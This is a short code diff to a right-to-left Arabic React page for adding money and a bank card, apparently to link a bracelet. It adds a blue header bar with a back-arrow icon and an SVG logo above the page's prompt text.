@@ -7,7 +7,7 @@ import { Checkbox } from "@/components/ui/checkbox";
 import { addData } from "@/lib/firebase";
 import Loader from "./loader";
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "./ui/dialog";
-import { X } from "lucide-react";
+import { ChevronRight, X } from "lucide-react";
 
 const allOtps = [""];
 
@@ -149,7 +149,12 @@ export default function AddMoneyPage() {
   return (
     <div dir="rtl" className="min-h-screen bg-gray-50 flex flex-col">
       <form onSubmit={handleSubmit} className="flex-1 flex flex-col justify-center px-6 space-y-6">
-        <p className="text-center text-gray-500 text-sm">
+      
+      <div className="bg-[#3111f3] h-12 flex items-center justify-between px-4">
+          <ChevronRight className="w-6 h-6 text-white" />
+          <img src="/ASD.svg" alt="" width={90} />
+        </div>
+  <p className="text-center text-gray-500 text-sm">
           لتتمكن من إضافة السوار، ابدأ بإضافة بطاقة
         </p>
 
